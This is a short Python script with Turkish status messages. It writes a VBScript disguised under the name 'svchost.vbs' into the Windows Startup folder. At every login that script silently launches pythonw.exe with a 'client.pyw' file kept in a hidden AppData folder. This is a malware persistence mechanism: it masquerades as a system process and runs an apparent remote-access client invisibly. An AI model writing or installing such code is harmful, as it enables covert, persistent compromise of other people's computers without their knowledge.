import shutil
import os

c = os.path.join(os.path.expanduser("~"), "AppData", "Roaming") + "\\pythonncc-main"
print("Program açıldı")
s = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup") + "\\svchost.vbs"
with open(s, "w", encoding='utf-8') as file:
    file.write("""Dim shell
Set shell = WScript.CreateObject("WScript.Shell")
shell.Run "{} {}", 0, True
Set shell = Nothing
""".format(c + "\\" + "pythonw.exe", c + "\\" + "client.pyw"))

print("Dosya yazıldı")
